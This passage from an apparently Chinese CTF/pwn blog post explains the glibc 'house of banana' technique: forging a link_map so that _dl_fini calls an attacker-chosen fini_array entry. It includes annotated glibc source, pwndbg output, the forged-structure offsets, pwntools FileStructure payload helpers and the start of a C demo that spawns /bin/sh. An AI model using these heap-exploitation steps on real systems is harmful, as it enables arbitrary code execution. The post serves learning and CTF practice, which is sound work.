class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">         copy the pointers in.  */</span></span><br><span class="line">	  <span class="comment">// nloaded =&gt; 4</span></span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">link_map</span> *maps[nloaded];</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">link_map</span> *l;</span><br><span class="line">      <span class="built_in">assert</span>(nloaded != <span class="number">0</span> || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">// ns=0    pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded</span></span><br><span class="line">	  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_next.l_next.l_next.l_next  直到出现0</span></span><br><span class="line">      <span class="keyword">for</span> (l = <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">        <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">        <span class="comment">// pwndbg p _rtld_global._dl_ns[0]._ns_loaded.l_real</span></span><br><span class="line">        <span class="comment">// 需要进入这个if线</span></span><br><span class="line">        <span class="keyword">if</span> (l == l-&gt;l_real) &#123;</span><br><span class="line">          <span class="built_in">assert</span>(i &lt; nloaded);   <span class="comment">// 所以说不会超过4个</span></span><br><span class="line"></span><br><span class="line">          maps[i] = l;</span><br><span class="line">          l-&gt;l_idx = i;</span><br><span class="line">          ++i;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">             are not dlclose()ed from underneath us.  */</span></span><br><span class="line">          ++l-&gt;l_direct_opencount;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">assert</span>(ns != LM_ID_BASE || i == nloaded);  <span class="comment">// 过其中一个检查，i==nloaded,也就是全部的if线都要进入。</span></span><br><span class="line">      <span class="built_in">assert</span>(ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">      <span class="comment">// nmaps = 4</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now we have to do the sorting.  We can skip looking for the</span></span><br><span class="line"><span class="comment">         binary itself which is at the front of the search list for</span></span><br><span class="line"><span class="comment">         the main namespace.  */</span></span><br><span class="line">      _dl_sort_maps(maps, nmaps, (ns == LM_ID_BASE), <span class="literal">true</span>); </span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">         from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">         various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">         count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">         we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">         from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">         lock.  */</span></span><br><span class="line">      __rtld_lock_unlock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">         call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">         the front.  */</span></span><br><span class="line">	  <span class="comment">// nmaps = 4</span></span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i) &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">link_map</span> *l = maps[i];   <span class="comment">// _ns_loaded</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_init_called) &#123;</span><br><span class="line">          _dl_call_fini(l);            <span class="comment">// 进入这个函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">          <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">          _dl_audit_objclose(l);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">        --l-&gt;l_direct_opencount;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      _dl_audit_activity_nsid(ns, LA_ACT_CONSISTENT);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (!do_audit &amp;&amp; <span class="built_in">GLRO</span>(dl_naudit) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    do_audit = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> again;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">GLRO</span>(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))</span><br><span class="line">    _dl_debug_printf(</span><br><span class="line">        <span class="string">&quot;\nruntime linker statistics:\n&quot;</span></span><br><span class="line">        <span class="string">&quot;           final number of relocations: %lu\n&quot;</span></span><br><span class="line">        <span class="string">&quot;final number of relocations from cache: %lu\n&quot;</span>,</span><br><span class="line">        <span class="built_in">GL</span>(dl_num_relocations), <span class="built_in">GL</span>(dl_num_cache_relocations));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>走到 <code>_dl_call_fini</code></p>
<ul>
<li>存在一个函数调用 <code>((fini_t)array[sz])()</code>，map为参数，也就是上面的 <code>GL(dl_ns)[ns]._ns_loaded</code> 和其 next，next-&gt;next…</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _dl_call_fini(<span class="type">void</span> *closure_map) &#123;</span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded 和 l_next 指针</span></span><br><span class="line">  <span class="comment">// pwndbg p *(struct link_map *) 上一个指令地址</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">link_map</span> *map = closure_map;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">GLRO</span>(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))</span><br><span class="line">    _dl_debug_printf(<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>, map-&gt;l_name, map-&gt;l_ns);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">  map-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[26]</span></span><br><span class="line">  <span class="built_in">ElfW</span>(Dyn) *fini_array = map-&gt;l_info[DT_FINI_ARRAY];</span><br><span class="line">  <span class="keyword">if</span> (fini_array != <span class="literal">NULL</span>) &#123;</span><br><span class="line">	<span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_addr</span></span><br><span class="line">	<span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[26].d_un.d_val</span></span><br><span class="line">    <span class="built_in">ElfW</span>(Addr) *array = (<span class="built_in">ElfW</span>(Addr) *)(map-&gt;l_addr + fini_array-&gt;d_un.d_ptr);</span><br><span class="line">    <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[28].d_un.d_val / 8</span></span><br><span class="line">    <span class="type">size_t</span> sz = (map-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="built_in">sizeof</span>(<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">	<span class="comment">// 不管什么类型，最后调用的函数地址可以得到</span></span><br><span class="line">    <span class="keyword">while</span> (sz-- &gt; <span class="number">0</span>) ((<span class="type">fini_t</span>)array[sz])();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">  <span class="built_in">ElfW</span>(Dyn) *fini = map-&gt;l_info[DT_FINI];</span><br><span class="line">  <span class="keyword">if</span> (fini != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="built_in">DL_CALL_DT_FINI</span>(map, ((<span class="type">void</span> *)map-&gt;l_addr + fini-&gt;d_un.d_ptr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要是函数调用能攻击一下就行，为了更容易的通过if的条件的，我们一般替换链表最后一个 link_map，也就是打第3个linkmap<code>ns_loaded.l_next.l_next.l_netx</code></p>
<ul>
<li>这是部分的内容，只截取了我们需要的内容</li>
<li>伪造l_addr, fini_array-&gt;d_un.d_ptr 内容</li>
<li>DT_FINI_ARRAY 为 26，DT_FINI_ARRAYSZ 为 28</li>
<li>因为源码可能比较抽象，不如直接打印出来，这里只截取有用的部分</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p **(struct link_map **) 0x7ffff7fbb188</span><br><span class="line"><span class="variable">$5</span> = &#123;</span><br><span class="line">  l_addr = 140737349943296,</span><br><span class="line">  l_name = 0x7ffff7fbb660 <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,</span><br><span class="line">  l_ld = 0x7ffff7e18bc0,</span><br><span class="line">  l_next = 0x7ffff7fbbb90,</span><br><span class="line">  l_prev = 0x7ffff7fbb170,</span><br><span class="line">  l_real = 0x7ffff7fbb680,</span><br><span class="line">  l_ns = 0,</span><br><span class="line">  l_libname = 0x7ffff7fbbb10,</span><br><span class="line">  l_info = &#123;0x0, 0x7ffff7e18bc0, 0x7ffff7e18c70, 0x7ffff7e18c60, 0x7ffff7e18c00, 0x7ffff7e18c20, 0x7ffff7e18c30, 0x7ffff7e18ca0, 0x7ffff7e18cb0, 0x7ffff7e18cc0, 0x7ffff7e18c40, 0x7ffff7e18c50, 0x0, 0x0, 0x7ffff7e18bd0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18c80, 0x0, 0x0, 0x7ffff7e18c90, 0x0, 0x7ffff7e18be0, 0x0, 0x7ffff7e18bf0, 0x0, 0x0, 0x7ffff7e18cf0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18d10, 0x7ffff7e18d00, 0x7ffff7e18ce0, 0x7ffff7e18cd0, 0x0, 0x0, 0x7ffff7e18d30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18d20, 0x0 &lt;repeats 25 <span class="built_in">times</span>&gt;, 0x7ffff7e18c10&#125;,</span><br><span class="line"></span><br><span class="line">pwndbg&gt; ptype ((struct link_map **) <span class="number">0</span>x7ffff7fbb188 )-&gt;l_info</span><br><span class="line">	type = struct &#123;</span><br><span class="line">	    Elf64_Sxword d_tag;</span><br><span class="line">	    union &#123;</span><br><span class="line">	        Elf64_Xword d_val;</span><br><span class="line">	        Elf64_Addr d_ptr;</span><br><span class="line">	    &#125; d_un;</span><br><span class="line">	&#125; *[<span class="number">77</span>]</span><br></pre></td></tr></table></figure>


<p>伪造，堆地址 A</p>
<ul>
<li>l &#x3D; l-&gt;real &#x3D;&gt; A + 0x28 内容放着堆地址 <code>0x28 = distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_real</code></li>
<li>l-&gt;l_init_called 不为0，数字随意，根据版本而异。 <code>distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_init_called</code>。我测的是0x312</li>
<li><code>map.l_info[26]</code> 不为 0, <code>distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_info[26]</code></li>
<li><code>map.l_info[28]</code> + 8 控制循环次数，一般写成1就行</li>
<li>控制函数执行流 <code>map-&gt;l_addr + fini_array-&gt;d_un.d_ptr</code>。也就是 <code>map-&gt;l_addr + map-&gt;l_info[26]-&gt;d_un.d_ptr</code></li>
<li>fini_array <code>map.l_info[26]</code>偏移是0x110。那么28是0x120</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// l = l-&gt;real</span></span><br><span class="line">fake+<span class="number">0x28</span> = fake</span><br><span class="line"><span class="comment">// l-&gt;l_init_called，但是测试后是一个magic num，需要将其余结构体的linkmap 的 l_init_called 打印出来赋值</span></span><br><span class="line">fake+<span class="number">0x312</span> = <span class="number">0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意，需要设置 l_next 位置为0才行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面的就比较固定了</span></span><br><span class="line"><span class="comment">// map.l_info[26]</span></span><br><span class="line">fake+<span class="number">0x110</span> = fake+<span class="number">0x40</span></span><br><span class="line"><span class="comment">// 0x48 是 d_un 结构体指针</span></span><br><span class="line">fake+<span class="number">0x48</span> = fake+<span class="number">0x58</span></span><br><span class="line"><span class="comment">// 后面加的那个东西</span></span><br><span class="line">fake+<span class="number">0x58</span> = shell    <span class="comment">// 0 + shell 执行shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// map.l_info[28]。由上可知，为0，同时为 26 的 d_tag 成员</span></span><br><span class="line">fake+<span class="number">0x120</span> = fake+<span class="number">0x48</span></span><br><span class="line"><span class="comment">// l_info[28] 的 d_un 指针。 sz=1</span></span><br><span class="line">fake+<span class="number">0x50</span> = <span class="number">8</span></span><br></pre></td></tr></table></figure>

<h2 id="pwntools-filepointer"><a href="#pwntools-filepointer" class="headerlink" title="pwntools filepointer"></a>pwntools filepointer</h2><p>其实看pwntools文档可以看出其中对 <code>IO_FILE</code> 也存在很多可以利用的点</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwnlib.filepointer <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>

<ol>
<li>IO_FILE 结构体</li>
</ol>
<ul>
<li><code>_wide_data</code> 就是我们现在常利用的点。</li>
<li>改变成员也只是需要 <code>fs.flags = 0x123</code> 直接赋值</li>
<li>两个 unknown 变量填充结构体</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">FileStructure(null=<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>FileStructure()</span><br><span class="line">&#123; flags: <span class="number">0x0</span></span><br><span class="line"> _IO_read_ptr: <span class="number">0x0</span></span><br><span class="line"> _IO_read_end: <span class="number">0x0</span></span><br><span class="line"> _IO_read_base: <span class="number">0x0</span></span><br><span class="line"> _IO_write_base: <span class="number">0x0</span></span><br><span class="line"> _IO_write_ptr: <span class="number">0x0</span></span><br><span class="line"> _IO_write_end: <span class="number">0x0</span></span><br><span class="line"> _IO_buf_base: <span class="number">0x0</span></span><br><span class="line"> _IO_buf_end: <span class="number">0x0</span></span><br><span class="line"> _IO_save_base: <span class="number">0x0</span></span><br><span class="line"> _IO_backup_base: <span class="number">0x0</span></span><br><span class="line"> _IO_save_end: <span class="number">0x0</span></span><br><span class="line"> markers: <span class="number">0x0</span></span><br><span class="line"> chain: <span class="number">0x0</span></span><br><span class="line"> fileno: <span class="number">0x0</span></span><br><span class="line"> _flags2: <span class="number">0x0</span></span><br><span class="line"> _old_offset: <span class="number">0xffffffff</span></span><br><span class="line"> _cur_column: <span class="number">0x0</span></span><br><span class="line"> _vtable_offset: <span class="number">0x0</span></span><br><span class="line"> _shortbuf: <span class="number">0x0</span></span><br><span class="line"> unknown1: <span class="number">0x0</span></span><br><span class="line"> _lock: <span class="number">0x0</span></span><br><span class="line"> _offset: <span class="number">0xffffffffffffffff</span></span><br><span class="line"> _codecvt: <span class="number">0x0</span></span><br><span class="line"> _wide_data: <span class="number">0x0</span></span><br><span class="line"> unknown2: <span class="number">0x0</span></span><br><span class="line"> vtable: <span class="number">0x0</span>&#125;</span><br></pre></td></tr></table></figure>


<ol start="2">
<li>house of orange</li>
</ol>
<ul>
<li>io_list_all 地址</li>
<li>伪造的 vtable 地址</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>fileStr = FileStructure(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = fileStr.orange(io_list_all=<span class="number">0xfacef00d</span>, vtable=<span class="number">0xcafebabe</span>)</span><br></pre></td></tr></table></figure>


<ol start="3">
<li>stdout leak</li>
</ol>
<ul>
<li>从 addr 泄露 size 大小的数据</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fileStr = FileStructure(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = fileStr.write(addr=<span class="number">0xcafebabe</span>, size=<span class="number">100</span>)</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>packing，因为我们需要伪造file结构体，因此我们可以使用如下函数</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 根据 context.arch打包， 类似 p32，p64 函数</span></span><br><span class="line">flat([</span><br><span class="line">	  con1,</span><br><span class="line">	  con2</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset: con, 类似于 cyclic(offset) + p64(con)</span></span><br><span class="line">flat(&#123;</span><br><span class="line">	<span class="number">0xe0</span>: <span class="number">100</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相对偏移</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flat(&#123;<span class="number">0xe0</span>:&#123;<span class="number">0x0</span>: <span class="number">100</span>, <span class="number">0x10</span>: <span class="number">200</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同时可以指定填充内容 和 总长度，因为我们伪造结构体需要满足一定条件</span></span><br><span class="line">flat(&#123;<span class="number">0xe0</span>:<span class="number">0x100</span>&#125;, filler=<span class="string">b&quot;\x00&quot;</span>, length=<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用法和flat(&#123;&#125;) 一样 官方文档是 alias of flat</span></span><br><span class="line">fit(&#123;&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>最好手动调试一下 largebin attack 和 house_of_banana。</p>
<h3 id="house-of-banana-1"><a href="#house-of-banana-1" class="headerlink" title="house of banana"></a>house of banana</h3><p>参考一下 <a target="_blank" rel="noopener" href="https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">house_of_banana源码分析</a>这一篇文章的demo</p>
<ul>
<li>注意改rtld相关指针和libc的偏移大小</li>
</ul>
<p>makefile</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CC := gcc</span><br><span class="line">CFLAFS := -g </span><br><span class="line"></span><br><span class="line">all: house_of_banana large_bin_attack</span><br><span class="line"><span class="keyword">default</span>: house_of_banana  large_bin_attack</span><br><span class="line"></span><br><span class="line">TARGET := house_of_banana  large_bin_attack</span><br><span class="line"></span><br><span class="line">house_of_banana: house_of_banana.c </span><br><span class="line">	$(CC) $(CFLAFS) $^ -o $@</span><br><span class="line"></span><br><span class="line">large_bin_attack: large_bin_attack.c </span><br><span class="line">	$(CC) $(CFLAFS) $^ -o $@</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">	rm -f $(TARGET) </span><br></pre></td></tr></table></figure>

<p>house of banana</p>
<ul>
<li>伪造结构体 l_next 为 0</li>
<li>l_init_called 一个比较神奇的数字，具体的libc打印</li>
<li>ubuntu 22.04 LTS 测试一下，在gdb 下可以执行一个命令就会崩溃。</li>
<li>高版本libc 没有patch进行测试，但是根据源码可行（理论上）</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123; </span><br><span class="line">  <span class="built_in">execve</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">get_libc_base</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> to;</span><br><span class="line">  <span class="type">uint64_t</span> from;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line"></span><br><span class="line">  FILE *file;</span><br><span class="line">  file = <span class="built_in">fopen</span>(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), file)) &#123;</span><br><span class="line">    <span class="comment">// printf(&quot;%s\n&quot;, buf);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;libc.so.6&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx-%lx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">      <span class="built_in">fclose</span>(file);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;libc =&gt; %#lx-%#lx\n&quot;</span>, from, to);</span><br><span class="line">      <span class="comment">// getchar();</span></span><br><span class="line">      <span class="keyword">return</span> from;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> libc_base = <span class="built_in">get_libc_base</span>();</span><br><span class="line">  <span class="type">uint64_t</span> rtld_global = libc_base + <span class="number">0x3fd040</span>;</span><br><span class="line">  <span class="comment">// &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span></span><br><span class="line">  <span class="type">uint64_t</span> *next_node = (<span class="type">uint64_t</span> *)(rtld_global - <span class="number">0x41ec8</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span 